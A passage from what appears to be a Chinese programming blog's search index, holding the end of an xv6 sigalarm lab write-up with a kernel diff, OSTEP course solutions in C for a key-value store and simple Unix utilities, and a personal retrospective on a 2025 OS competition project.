和 函数调用 。\n定时的逻辑比较清楚，在 struct proc 中添加变量 ticksum，代表从上次 handler 处理完成开始进程累计的时钟中断次数，该变量在进程初始化时设置为 0，随后每次遇到时钟中断，都自增 1，如果自增后的值达到了设定的间隔 ticks，则将其复位为 0，调用 handler 函数。\n函数调用是一个需要考虑的问题，这里不能直接利用函数指针 handler 进行函数调用，因为 handler 指向的函数位于用户空间下，而 usertrap 位于内核态下，页表的地址映射不同，无法直接根据用户空间下的虚拟地址进行寻址（直接调用引发的错误如下图所示），需要在本次中断结束返回到用户态之后执行。因此正确的做法应该是设置进程 struct proc 的 epc 寄存器为函数指针 handler，这样在中断处理完成，进程回到用户态并被 CPU 调度执行后，寄存器 pc 将被设置预先保存的 epc 的值，这样函数 handler 就被成功调度执行了。至此，test0 应该成功通过。\n\n在进入到 test1\\&amp;2 之前，有必要说一说我的一些思考：在上面的讨论中，我们知道内核无法直接根据函数指针 handler 的值进行用户空间函数的调用，那能否在内核态下根据进程的用户态页表和给定的虚拟地址，利用软件地址转换机制（vm.c 中的 walkaddr 函数）来将用户空间的虚拟地址转换为物理地址进行寻址呢（这也是我最开始的想法）？答案是不行，因为即便是在内核态下，程序中的地址仍然是虚拟地址，也就是说即便知道用户态函数实际存储的物理地址，我们也只有在 给出一个虚拟地址，该虚拟地址经过内核页表地址转换之后，刚好得到了正确的物理地址， 才可能成功。而实际上，尽管内核 KERNBASE 到 PHYSTOP 地址都是直接映射，但内核页表中可能并没有所需要的页表项，因此，这并不会成功。\ntest1/test2(): resume interrupted codetest1 的目标是，存储和恢复中断处理前后的寄存器状态。那么问题就来了：为什么需要存储这些寄存器？需要存储哪些寄存器？\n其实最开始，我是有些纠结寄存器状态的存储目的是什么，认为可能是与内核态和用户态切换有关，但仔细想想，这部分的工作应该是由 trampoline.S 和 usertrapret 来完成的，那么为什么还需要存储和恢复寄存器？\n事实上，在系统未关闭中断的情况下，时钟中断可能在程序执行的任何时刻发生，且在返回到原程序位置继续执行之前还需要执行预先设定好的 handler 函数，那么寄存器状态的保存将是必要的。一方面在执行 handler 函数期间，如果 handler 函数包含一些对局部变量的处理，那么通用寄存器的值将会发生改变，从而使得中断返回时程序的执行结果与预期不符；另一方面，由于 epc 的值被手动改变，如果执行完 handler 之后不恢复中断发生时的保存的 pc 值，那么 pc 将会指向 handler 函数末尾的下一条指令，中断因此无法正常返回。 简单来说，这部分的操作相当于手动模拟了 线程 的切换。\n另一个问题是：需要存储哪些寄存器？好吧，在解决这个 Lab 时我其实偷了点懒，没有去仔细琢磨，只是简单地将整个 trapframe 中所有的寄存器都保存下来。但根据上面的讨论，再结合 RISC-V 的 calling convention，应该不难得出答案。\n最后的 test2 就比较简单了，目标是：\n\nPrevent re-entrant calls to the handler——if a handler hasn’t returned yet, the kernel shouldn’t call it again.\n\n解决的办法有很多，可以额外在 strcut proc 添加一个变量，用来表示进程当前是否正处在处理 handler 的过程中，如果是，则不进行 ticksum 的自增操作。这里我采用了一点 小技巧 ：不添加额外的变量，而是在处理 handler 前将 ticksum 置为负数，并在自增前判断 ticksum 是否非负，在 sys_sigreturn 时再将它置为 0，本质上与添加变量的操作大差不差。\n代码diff --git a/Makefile b/Makefileindex 7a7e380..bc4d47a 100644--- a/Makefile+++ b/Makefile@@ -188,6 +188,7 @@ UPROGS=\\ \t$U/_grind\\ \t$U/_wc\\ \t$U/_zombie\\+\t$U/_alarmtest\\ diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..80096f7 100644--- a/kernel/proc.c+++ b/kernel/proc.c@@ -119,6 +119,7 @@ allocproc(void) found:   p-&gt;pid = allocpid();   p-&gt;state = USED;+  p-&gt;ticksum = 0; // here    // Allocate a trapframe page.   if((p-&gt;trapframe = (struct trapframe *)kalloc()) == 0)&#123;diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..c1d5a23 100644--- a/kernel/proc.h+++ b/kernel/proc.h@@ -105,4 +105,10 @@ struct proc &#123;   struct file *ofile[NOFILE];  // Open files   struct inode *cwd;           // Current directory   char name[16];               // Process name (debugging)++  int ticks;         // here+  void (*handler)();+  int ticksum;++  struct trapframe strapframe; &#125;;diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..d4e5585 100644--- a/kernel/syscall.c+++ b/kernel/syscall.c@@ -104,6 +104,8 @@ extern uint64 sys_unlink(void); extern uint64 sys_wait(void); extern uint64 sys_write(void); extern uint64 sys_uptime(void);+extern uint64 sys_sigalarm(void); // here+extern uint64 sys_sigreturn(void);  static uint64 (*syscalls[])(void) = &#123; [SYS_fork]    sys_fork,@@ -127,6 +129,8 @@ static uint64 (*syscalls[])(void) = &#123; [SYS_link]    sys_link, [SYS_mkdir]   sys_mkdir, [SYS_close]   sys_close,+[SYS_sigalarm]  sys_sigalarm,  // here+[SYS_sigreturn] sys_sigreturn, &#125;;  voiddiff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..a040610 100644--- a/kernel/syscall.h+++ b/kernel/syscall.h@@ -20,3 +20,5 @@ #define SYS_link   19 #define SYS_mkdir  20 #define SYS_close  21+#define SYS_sigalarm  22  // here+#define SYS_sigreturn 23diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex f27c007..ee859ed 100644--- a/kernel/sysproc.c+++ b/kernel/sysproc.c@@ -96,3 +96,28 @@ sys_uptime(void)   release(&amp;tickslock);   return xticks; &#125;++// here+uint64 sys_sigalarm(void) &#123;+\tstruct proc *p = myproc();++\tif (argint(0, &amp;(p-&gt;ticks)) &lt; 0) &#123;+\t\treturn -1;+\t&#125;++\tif (argaddr(1, (uint64 *)&amp;(p-&gt;handler)) &lt; 0) &#123;+\t\treturn -1;+\t&#125;++\treturn 0;+&#125;++uint64 sys_sigreturn(void) &#123;+\tstruct proc *p = myproc();+\t+\t// restore registers+\tmemmove(p-&gt;trapframe, &amp;(p-&gt;strapframe), sizeof(p-&gt;strapframe));++\tp-&gt;ticksum = 0;+\treturn 0;+&#125;diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..447e6d8 100644--- a/kernel/trap.c+++ b/kernel/trap.c @@ -77,8 +77,17 @@ usertrap(void)     exit(-1);    // give up the CPU if this is a timer interrupt.-  if(which_dev == 2)+  if(which_dev == 2) &#123;+\t// here+\tif (p-&gt;ticks &gt; 0 &amp;&amp; p-&gt;ticksum &gt;= 0 &amp;&amp; ++(p-&gt;ticksum) &gt;= p-&gt;ticks) &#123;+\t  // save registers+\t  memmove(&amp;(p-&gt;strapframe), p-&gt;trapframe, sizeof(p-&gt;strapframe));++\t  p-&gt;ticksum = -1; // prevent re-entrant calls to the handler+\t  p-&gt;trapframe-&gt;epc = (uint64)p-&gt;handler;+\t&#125;     yield();+  &#125;    usertrapret(); &#125;diff --git a/user/user.h b/user/user.hindex b71ecda..422a4c1 100644--- a/user/user.h+++ b/user/user.h@@ -23,6 +23,8 @@ int getpid(void); char* sbrk(int); int sleep(int); int uptime(void);+int sigalarm(int ticks, void (*handler)()); // here+int sigreturn(void);  // ulib.c int stat(const char*, struct stat*);diff --git a/user/usys.pl b/user/usys.plindex 01e426e..84c6784 100755--- a/user/usys.pl+++ b/user/usys.pl@@ -36,3 +36,5 @@ entry(&quot;getpid&quot;); entry(&quot;sbrk&quot;); entry(&quot;sleep&quot;); entry(&quot;uptime&quot;);+entry(&quot;sigalarm&quot;); # here+entry(&quot;sigreturn&quot;);\n","categories":["操作系统"],"tags":["操作系统","经验","xv6"]},{"title":"OSTEP Projects：KV","url":"/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/","content":"本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关课程项目 的 KV 部分，包含个人的代码实现和设计思路。\n\n思路题目要求实现一个最简单的数据库，以支持数据的持久化。\n每个操作由格式为 op,[arg1],[arg2] 的命令给出，那么首先要解决的问题就是参数的分离，再根据操作符 op 来对不同的操作进行特殊处理。字符串划分这里采用的是 strsep() 函数：该函数接收两个参数 char** stringp 和 const char* delim，stringp 是指向待分割字符串 string 的指针，delim 则是指定的分隔符，该函数的操作是查找 string 中第一个 delim 的位置 it，并将 stringp 指向 string 中 it + 1 的位置，同时返回string 开头到  it 所有字符所构成的子串（加上 &#39;\\0&#39; 终结符）。\n插入操作没什么好说的，直接使用 fprintf() 写入文件即可。对于查找和删除，则需要将数据从文件（数据库）中读取到内存，存储在特定的数据结构中，例如哈希表、红黑树等，但为了代码实现的简单，我使用的是最简单的链表。对于查找，先将所有数据读取到一个链表中，然后按顺序逐个进行查找；对于删除，将所有数据读取到一个链表中，然后逐个遍历链表，如果当前结点的键（key）与参数不同，则写入文件中，否则，不写入（相当于删除）。最后，为了防止内存的泄露，需要在每次结束查找和删除操作之后，将存储数据内容的链表结点的内存空间释放。\n代码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define DATA_BASE &quot;./database.txt&quot;typedef struct LineNode &#123;\tchar* line_buf;\tstruct LineNode* next;&#125; line_node;// 从文件fp中读取数据line_node* read_from_file(FILE* fp) &#123;\tline_node* dummy = (line_node*)malloc(sizeof(line_node)); // 哨兵结点\tline_node* p = dummy;\tsize_t sz = 0;\twhile (1) &#123;\t\tp-&gt;next = (line_node*)malloc(sizeof(line_node));\t\tp = p-&gt;next;\t\tif (getline(&amp;(p-&gt;line_buf), &amp;sz, fp) == -1) &#123;\t\t\tp-&gt;next = NULL;\t\t\tbreak;\t\t&#125;\t&#125;\treturn dummy-&gt;next;&#125;// 释放链表内存空间void free_list_mem(line_node* data) &#123;\twhile (data != NULL) &#123;\t\tline_node* temp = data;\t\tdata = data-&gt;next;\t\tfree(temp);\t&#125;&#125;int main(int argc, char* argv[]) &#123;\tfor (int i = 1; i &lt; argc; ++i) &#123;\t\tchar* op = strsep(&amp;argv[i], &quot;,&quot;); // 操作符\t\tif (!strcmp(op, &quot;p&quot;)) &#123;\t\t\tchar* key = strsep(&amp;argv[i], &quot;,&quot;);\t\t\tchar* value = strsep(&amp;argv[i], &quot;,&quot;);\t\t\tif (argv[i] != NULL) &#123;\t\t\t\tprintf(&quot;bad command\\n&quot;);\t\t\t\tcontinue;\t\t\t&#125;\t\t\t\t\t\tFILE* fp = fopen(DATA_BASE, &quot;a&quot;);\t\t\tif (fp == NULL) &#123;\t\t\t\tfprintf(stderr, &quot;cannot open file %s\\n&quot;, DATA_BASE);\t\t\t\texit(1);\t\t\t&#125;\t\t\tfprintf(fp, &quot;%s,%s\\n&quot;, key, value);\t\t\tfclose(fp);\t\t&#125;\t\telse if (!strcmp(op, &quot;g&quot;)) &#123;\t\t\tchar* key = strsep(&amp;argv[i], &quot;,&quot;);\t\t\tif (argv[i] != NULL) &#123;\t\t\t\tprintf(&quot;bad command\\n&quot;);\t\t\t\tcontinue;\t\t\t&#125;\t\t\tFILE* fp = fopen(DATA_BASE, &quot;r&quot;);\t\t\tif (fp == NULL) &#123;\t\t\t\tfprintf(stderr, &quot;cannot open file %s\\n&quot;, DATA_BASE);\t\t\t\texit(1);\t\t\t&#125;\t\t\t\t\t\tline_node* data = read_from_file(fp);\t\t\tline_node* p = data;\t\t\tint flag = 0;\t\t\t\t\t\twhile (p != NULL) &#123;\t\t\t\tchar* entry = strdup(p-&gt;line_buf); // 条目备份（line_buf会被strsep()修改）\t\t\t\tchar* token = strsep(&amp;(p-&gt;line_buf), &quot;,&quot;);\t\t\t\tif (!strcmp(token, key)) &#123; // 找到key\t\t\t\t\tflag = 1;\t\t\t\t\tprintf(&quot;%s&quot;, entry);\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t\tp = p-&gt;next;\t\t\t&#125;\t\t\tif (!flag) &#123;\t\t\t\tprintf(&quot;%s not found\\n&quot;, key);\t\t\t&#125;\t\t\t\t\t\tfree_list_mem(data);\t\t\tfclose(fp);\t\t&#125;\t\telse if (!strcmp(op, &quot;d&quot;)) &#123;\t\t\tchar* key = strsep(&amp;argv[i], &quot;,&quot;);\t\t\tif (argv[i] != NULL) &#123;\t\t\t\tprintf(&quot;bad command\\n&quot;);\t\t\t\tcontinue;\t\t\t&#125;\t\t\t\t\t\tFILE* fp = fopen(DATA_BASE, &quot;r&quot;);\t\t\tif (fp == NULL) &#123;\t\t\t\tfprintf(stderr, &quot;cannot open file %s\\n&quot;, DATA_BASE);\t\t\t\texit(1);\t\t\t&#125;\t\t\tline_node* data = read_from_file(fp);\t\t\tfclose(fp);\t\t\t\t\t\t// 清空文件\t\t\tfp = fopen(DATA_BASE, &quot;w&quot;);\t\t\tif (fp == NULL) &#123;\t\t\t\tfprintf(stderr, &quot;cannot open file %s\\n&quot;, DATA_BASE);\t\t\t\texit(1);\t\t\t&#125;\t\t\tfclose(fp);\t\t\t\t\t\tfp = fopen(DATA_BASE, &quot;a&quot;);\t\t\tif (fp == NULL) &#123;\t\t\t\tfprintf(stderr, &quot;cannot open file %s\\n&quot;, DATA_BASE);\t\t\t\texit(1);\t\t\t&#125;\t\t\tline_node* p = data;\t\t\twhile (p != NULL) &#123;\t\t\t\tchar* entry = strdup(p-&gt;line_buf); // 条目备份\t\t\t\tchar* token = strsep(&amp;(p-&gt;line_buf), &quot;,&quot;);\t\t\t\tif (strcmp(token, key)) &#123; // 当前条目键值为key，不写入（相当于删除）\t\t\t\t\tfprintf(fp, &quot;%s&quot;, entry);\t\t\t\t&#125;\t\t\t\tp = p-&gt;next;\t\t\t&#125;\t\t\t\t\t\tfree_list_mem(data);\t\t\tfclose(fp);\t\t&#125;\t\telse if (!strcmp(op, &quot;c&quot;)) &#123;\t\t\tif (argv[i] != NULL) &#123;\t\t\t\tprintf(&quot;bad command\\n&quot;);\t\t\t\tcontinue;\t\t\t&#125;\t\t\tFILE* fp = fopen(DATA_BASE, &quot;w&quot;);\t\t\tif (fp == NULL) &#123;\t\t\t\tfprintf(stderr, &quot;cannot open file %s\\n&quot;, DATA_BASE);\t\t\t\texit(1);\t\t\t&#125;\t\t\tfclose(fp);\t\t&#125;\t\telse if (!strcmp(op, &quot;a&quot;)) &#123;\t\t\tif (argv[i] != NULL) &#123;\t\t\t\tprintf(&quot;bad command\\n&quot;);\t\t\t\tcontinue;\t\t\t&#125;\t\t\tFILE* fp = fopen(DATA_BASE, &quot;r&quot;);\t\t\tline_node* data = read_from_file(fp);\t\t\tline_node* p = data;\t\t\twhile (p != NULL) &#123;\t\t\t\tprintf(&quot;%s&quot;, p-&gt;line_buf);\t\t\t\tp = p-&gt;next;\t\t\t&#125;\t\t\tfree_list_mem(data);\t\t\tfclose(fp);\t\t&#125;\t\telse &#123;\t\t\tprintf(&quot;bad command\\n&quot;);\t\t\tcontinue;\t\t&#125;\t&#125;\treturn 0;&#125;\n","categories":["操作系统"],"tags":["操作系统","C","Linux"]},{"title":"OS功能挑战赛2025总结","url":"/2025/08/23/OS%E5%8A%9F%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B2025%E6%80%BB%E7%BB%93/","content":"随着最近 OS 功能挑战赛 2025 的落幕，既标志着这几个月比赛工作的结束，也标志着本人研一生活的结束。本文将作为一个简单的记录，对本次比赛的过程以及得到的经验教训做一个总结，同时也对未来的学习研究做一个展望。\n\n比赛回顾首先说一下比赛结果—— 三等奖 ，一个稍微有些令人失望的结果。但不管如何，比赛过程中的收获却是实打实的。\n\n\n项目的源代码已经开放在了 github 中，欢迎参考：\nLordaeronESZ/SEVFS: A simple encrypted versioning file system.\n\n时间线接下来，我将简单梳理一下本次比赛的整个时间线。\n首先是 3 月份，我们完成了比赛的报名和选题工作。其中选题工作并不那么顺利，最开始我们选题备选方案为：（1）proj121-使用哈希页表实现虚拟机的 stage-2 页表 和 （2）proj319-支持 RISC-V 架构的文件级加密文件系统。由于个人科研方向为虚拟化方向，因此两个题目中更偏向于前者。但通过对往年的参赛作品进行调研发现，已经有队伍做过了该题目并且基本完成了题目的所有要求，并最终获得了一等奖——我们再选择该题目能做的工作很有限，考虑再三后最终还是敲定了后者作为选题。\n随后便开始了初期的调研工作，由于文件系统是操作系统中我们不太熟悉的模块，因此首要工作便是学习其基本的设计与实现。我们选择的学习目标是 xv6，路径主要包括阅读源码（对照网上博客）、GDB 调试内核等方法，最终团队各成员建立起了对（基于 inode 结构的）文件系统的较为具象化的认知。这其中还发生了一件插曲：某一天我在查看赛题清单时发现，我们的选题 proj319 突然从上面消失了，于是便尝试联系了赛题导师，他给的回复是：赛题 在今年不再被支持 ，建议我们选择其他赛题。当时的想法是我们已经在该题目上花费了一定的时间了，就这么更换选题未免有些令人泄气，因此借由导师的帮助，向主办方说明了情况，赛题便又被重新列上了清单，但是仍然没有技术支持。\n时间来到 4 月份，我们确定了一套基本的技术路线：\n\n基于 xv6 文件系统实现一个基本的文件加密和版本管理的原型。\n移植到 Linux 中。\n进一步的完善和优化。\n\n这时候的基本分工较为清晰：我作为队长负责实现文件加密和版本管理原型，队员 A 负责将 xv6 文件系统的设计移植到 Linux 中，队员 B 则负责构建一个基本的运行环境，目标是能够使用 QEMU 模拟器运行一个我们自己编译的内核和自己制作的根文件系统。队员 B 的工作较为简单，很快便完成了。但是队员 A 的文件系统移植工作进展缓慢，主要原因是 xv6 文件系统没有 VFS 层，直接与内核整体相耦合，要进行这样的移植工作量属实不小。而我的版本管理原型在 xv6 这样简单教学操作系统上实现起来也处处受限，项目就此 陷入了瓶颈 。\n进入了五月份，我对项目的进展实在有些着急。因为比较残酷的是，时间已经过去了两个月了，我们项目的实际进度还是——零，毕竟我们的目标作品是 Linux 上的加密文件系统，而非 xv6 上的加密文件系统。于是在五一假期期间，我打算调整技术路线，改为：\n\n基于开源的教学用 Linux 内核文件系统——simplefs 进行开发。\n对 simplefs 进行完善和优化。\n对 simplefs 进行扩展，实现文件加密和版本管理机制。\n\n我首先是将 simplefs 进行了一定程度的精简：（1）将对多内核版本的支持舍弃，仅面向 Linux 6.12 版本。（2）删去日志的支持。并将其命名为 SEVFS（Simple Encrypted Versioning File System），至此，我们的基准文件系统就此诞生，项目开发终于 进入了正轨 。\n五月份算是整个比赛时间线中最为开发密集的一个月。我们完成了两级密钥结构的文件级加密机制，并参考 Versionfs 的设计实现了一个基本的版本管理机制。基本上一个完整的作品算是诞生了，后续便是 bug 修复和功能完善的工作。\n六月底是初赛作品提交截至的时间，因此在六月初对文件加密和版本管理机制进行完善之后，便开始着手准备文档、PPT 和演示视频等初赛材料，这个阶段的文档、PPT 什么的都制作得相对简陋，想着后续能够进一步完善。\n七月初的几天没有做什么工作，一直在等待着决赛名单的发布。一直到大约 10 号的时候，名单终于发出，我们便又开始投入到工作中去。由于此前在录制演示视频时发现了一些版本管理机制引入的 bug，我们的首要任务便是将其修复，这部分由我来完成。此外，为了考虑引入一些创新性的设计，我让队员 A 调研 TPM 相关的内容，并尝试引入基于 TPM 的密钥管理方式。而队员 B 则要求对之前遗留的与加密和版本管理无关的 bug 进行修复。这个月的工作现在回看，是相当低效的。由于长时间没有接触项目代码，我对之前实现的版本管理机制的细节已经有些生疏，导致 bug 修复的效率非常低，但好在最终还算是完成了。而队员 B 的工作进展也十分缓慢，在我看来主要原因还是在于我——提出的任务要求不够具体。\n时间来到八月份，月初我和队友 A 请了个暑休假期，等回来时离决赛作品的提交只剩下一周时间了。这一周基本没干别的，只是完善文档、重新制作答辩 PPT、准备答辩。最终在 8 月 19 日出发前往武汉，20 日上午便完成了答辩的工作，随后在武汉玩了一天半的时间，22 日参加完颁奖典礼便返回了学校。\n经验总结根据上面的描述，不难发现，整个比赛的时间安排其实是比较零碎的。真正的密集开发过程其实只有 五月一个月 而已，其他大部分时间都只是在调研、小修小补以及制作文档材料，这样的时间比例个人认为是不太合理的。出现这种情况的一个很重要的原因是 材料准备开始的太早了 ，导致在开展文档撰写等工作时不紧不慢，效率十分低下。想着进一步的开发工作后面可以继续完成，但由于思维惰性的存在，以及长时间不接触项目导致对其的陌生感和畏惧感，最终原先计划实现的很多功能特性就此不了了之了。结果就是我们最终提交的作品基本上与五月底完成的初始版本没有太大的区别，还处在一个非常初级的阶段：支持的版本留存策略比较简陋，版本存储策略也只有全量存储的方式……\n同样的情况还发生在文档制作上，文档的一部分章节我们起初也写得比较简陋，想着后续能够继续完善，但长时间不接触之后也就将其搁置了，最终没能做出什么修改。由此得到的一个经验教训是：一个待办项不要留存太长时间 ，最好设置一个 deadline，并尽量始终对其保持一定的熟悉度，防止热情的消散。\n另一个经验教训是：作为队长（leader），要想最大化队员的工作效率，应该尽量 将派发的工作任务足够细化 ，而不应该对此进行逃避（这与个人懒于处理琐事的个性相关），只是简单地要求“调研相关内容”等等。\n最后， 演讲部分很重要 。功能挑战赛由于没有客观评测分数，而是完全由评委主观来判断，因此无论项目的实际内容做得如何，至少表面功夫得到位。而这主要分为两个方面——仓库记录和现场答辩。前者我认为我们算是完成得很不错的，不管是 Git commit 记录的完备，还是编码的规范性，亦或是 gitlab 的协同开发工作流的应用，都足够令人满意，这大概也是初赛能得到 $32/36$ 这样一个不错分数的主要原因。但后者则显得差了一些，准备时间不足固然是原因之一，但更主要的原因还是我不愿意花太多的时间在打磨 PPT 这样的“琐事”上，最终也没能按照导师的建议好好地对其进行完善，导致 PPT 的演讲效果不是太好，虽然答辩时的临场发挥不算太差，但最终还是与二等奖失之交臂，属实有些遗憾。\n未来展望简单总结一下研一这一学年的学习经历，首先是竞赛等活动：去年的 7 月 ~ 11 月 随实验室同门参与了 AI 系统相关的比赛——先导杯，并最终获得了 二等奖 的成绩，不过我在其中贡献相对较低，更多的是一次经历。另外在 10 月 ~ 12 月间带领我们学校的本科生 &amp; 研究生参与清华大学和泉城实验室主办的开源操作系统训练营，最终总共有 3 名同学进入了最后的项目阶段，而我是其中唯一一位 通过并获得证书 的。同时我还尝试参与了操作系统应用赛的华东区域赛，但最终由于时间原因没能坚持下去。最后便是今年的 3 月 ~ 8 月作为队长的身份参与操作系统功能挑战赛，并最终获得了 三等奖 的成绩。\n\n\n在研究院实习期间，我主要做了两部分的工作：首先是为 QEMU-SW 模拟器引入了对硬件虚拟化的模拟，使得其能够在 TCG 模拟环境下启动一个 QEMU/KVM 虚拟机，现在已完成。其次是着手研究 AMD SEV-SNP 和 Arm CCA 等机密虚拟机（CVM）设计方案，并尝试在 SW 下设计并实现一个基本的 CVM 原型，目前工作仍在推进中。\n总的来说，这一年学习所带来的能力提升是非常显著的，尤其是工程能力方面。接下来的一年应该将更多的时间放在学术层面，争取早日找到合适的科研创新点，并完成研究生所要求的科研工作。总之，继续努力吧！\n","categories":["经验"],"tags":["操作系统","经验"]},{"title":"OSTEP Projects：Unix Utilities","url":"/2024/05/04/OSTEP%20Projects%EF%BC%9AUnix%20Utilities/","content":"本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关课程项目 的 Unix Utilities 部分，包含个人的代码实现和设计思路。\n\nwcat思路要实现一个 wcat 命令，打印从文件中读取到的所有字符。\n编写一个 for 循环遍历所有的参数（需要读取的文件的路径），打开该文件，依照 README 中的提示使用 fgets() 每次读取一行，并将读取到的字符串打印到标准输出即可。\n代码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define BUF_SIZE 1024int main(int argc, char* argv[]) &#123;\tchar buffer[BUF_SIZE];\tfor (int i = 1; i &lt; argc; ++i) &#123;\t\tFILE* fp = fopen(argv[i], &quot;r&quot;);\t\tif (fp == NULL) &#123;\t\t\tprintf(&quot;wcat: cannot open file\\n&quot;);\t\t\texit(1);\t\t&#125;\t\twhile (fgets(buffer, sizeof(buffer), fp)) &#123;\t\t\tprintf(&quot;%s&quot;, buffer);\t\t&#125;\t\tfclose(fp);\t&#125;\treturn 0;&#125;\nwgrep思路要实现一个 wgrep 命令，进行字符串匹配。\n根据 README 中的提示，本题测试样例中一行的字符可能会很长，因此建议使用 getline() 这类动态分配内存的函数（无需预先指定缓冲区大小）。这里要求当只有一个参数 term 时，从标准输入中读取字符串，读取方式与从文件中读取一致，区别在于文件流参数的不同：从文件中读取为调用 fopen() 返回的指针，而从标准输入读取为 stdin。\n每次读取一行字符串后，需要判断该字符串中是否存在指定的子串 term，这就回到了经典的字符串匹配的问题上。为了代码编写的方便，这里我使用的是最简单的朴素字符串匹配算法，当然也可以使用有限自动机、KMP 算法、Boyer-Moore 算法等更为高效的算法，值得注意的是，Unix 系统的 grep 命令使用的正是 Boyer-Moore 算法。\n代码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// 朴素字符串匹配算法int match(char term[], size_t m, char buffer[], size_t n) &#123;\tif (n &lt; m) return 0;\tfor (int i = 0; i &lt; n - m; ++i) &#123;\t\tint flag = 1;\t\tfor (int j = 0; j &lt; m; ++j) &#123;\t\t\tif (term[j] != buffer[i + j]) &#123;\t\t\t\tflag = 0;\t\t\t\tbreak;\t\t\t&#125;\t\t&#125;\t\tif (flag) return 1;\t&#125;\treturn 0;&#125;int main(int argc, char* argv[]) &#123;\tif (argc &lt;= 1) &#123;\t\tprintf(&quot;wgrep: searchterm [file ...]\\n&quot;);\t\texit(1);\t&#125;\t\tchar* term = argv[1];\tsize_t m = strlen(term);\tchar* buffer = NULL;\tsize_t sz = 0;\tssize_t n = 0;\t\tif (argc == 2) &#123; // 从标准输入中读取\t\twhile ((n = getline(&amp;buffer, &amp;sz, stdin)) != -1) &#123;\t\t\tif (match(term, m, buffer, (size_t)n)) &#123;\t\t\t\tprintf(&quot;%s&quot;, buffer);\t\t\t&#125;\t\t&#125;\t&#125;\telse &#123;\t\tfor (int i = 2; i &lt; argc; ++i) &#123;\t\t\tFILE* fp = fopen(argv[i], &quot;r&quot;);\t\t\tif (fp == NULL) &#123;\t\t\t\tprintf(&quot;wgrep: cannot open file\\n&quot;);\t\t\t\texit(1);\t\t\t&#125;\t\t\twhile ((n = getline(&amp;buffer, &amp;sz, fp)) != -1) &#123;\t\t\t\t// 判断字符串是否匹配\t\t\t\tif (match(term, m, buffer, (size_t)n)) &#123;\t\t\t\t\tprintf(&quot;%s&quot;, buffer);\t\t\t\t&#125;\t\t\t&#125;\t\t\tfclose(fp);\t\t&#125;\t\t&#125;\treturn 0;&#125;\nwzip思路实现一个简单的压缩命令，将连续重复的字符压缩为 cnt + ch。\n算法的逻辑如下：\n\n先将 ch 初始化为一个文件中不会出现的字符（例如 &#39;\\0&#39;），cnt 初始化为 0. \n遍历读取到的每次字符，若与 ch 相同，则将 cnt 加 1；若不同，则使用 fwrite() 写入标准输出，并把 ch 更新为当前字符，cnt 置为 1. 最后，在所有文件遍历完成后，再判断 cnt 是否大于 0，若大于 0，则写入。\n\n注意，这里的所有字符均要按照规则进行压缩，包括换行符（&#39;\\n&#39;），我最开始写的时候还对换行符进行特判，以此来忽略对其进行处理，属实是多此一举了。\n代码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char* argv[]) &#123;\tif (argc &lt;= 1) &#123;\t\tprintf(&quot;wzip: file1 [file2 ...]\\n&quot;);\t\texit(1);\t&#125;\t\tchar* buffer = NULL;\tsize_t sz = 0;\tssize_t n = 0;\tchar ch = &#x27;\\0&#x27;;\tint cnt = 0;\t\tfor (int i = 1; i &lt; argc; ++i) &#123;\t\tFILE* fp = fopen(argv[i], &quot;r&quot;);\t\tif (fp == NULL) &#123;\t\t\tprintf(&quot;wzip: cannot open file\\n&quot;);\t\t\texit(1);\t\t&#125;\t\twhile ((n = getline(&amp;buffer, &amp;sz, fp)) != -1) &#123;\t\t\tfor (int j = 0; j &lt; n; ++j) &#123;\t\t\t\tif (buffer[j] == ch) &#123;\t\t\t\t\t++cnt;\t\t\t\t&#125;\t\t\t\telse &#123;\t\t\t\t\tif (cnt &gt; 0) &#123;\t\t\t\t\t\tfwrite(&amp;cnt, sizeof(int), 1, stdout);\t\t\t\t\t\tfwrite(&amp;ch, sizeof(char), 1, stdout);\t\t\t\t\t&#125;\t\t\t\t\tch = buffer[j];\t\t\t\t\tcnt = 1;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t\tfclose(fp);\t&#125;\tif (cnt &gt; 0) &#123;\t\tfwrite(&amp;cnt, sizeof(int), 1, stdout);\t\tfwrite(&amp;ch, sizeof(char), 1, stdout);\t&#125;\treturn 0;&#125;\nwunzip思路相较于编码，解码就简单很多了。使用 fread() 每次读取一个整数 cnt 和一个字符 ch，并使用 for 循环打印 cnt 个 ch 到标准输出即可。\n代码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char* argv[]) &#123;\tif (argc &lt;= 1) &#123;\t\tprintf(&quot;wunzip: file1 [file2 ...]\\n&quot;);\t\texit(1);\t&#125;\t\tint cnt = 0;\tchar ch = &#x27;\\0&#x27;;\tsize_t rc = 0;\tfor (int i = 1; i &lt; argc; ++i) &#123;\t\tFILE* fp = fopen(argv[i], &quot;rb&quot;);\t\tif (fp == NULL) &#123;\t\t\tprintf(&quot;wunzip: cannot open file\\n&quot;);\t\t\texit(1);\t\t&#125;\t\twhile (1) &#123;\t\t\tif ((rc = fread(&amp;cnt, sizeof(int), 1, fp)) &lt; 1) &#123;\t\t\t\tbreak;\t\t\t&#125;\t\t\tif ((rc = fread(&amp;ch, sizeof(char), 1, fp)) &lt; 1) &#123;\t\t\t\tbreak;\t\t\t&#125;\t\t\tfor (int j = 0; j &lt; cnt; ++j) &#123;\t\t\t\tprintf(&quot;%c&quot;, ch);\t\t\t&#125;\t\t&#125;\t\tfclose(fp);\t&#125;\treturn 0;&#125;\n","categories":["操作系统"],"tags":["操作系统","C","Linux"]},{"title":"OpenGL入门 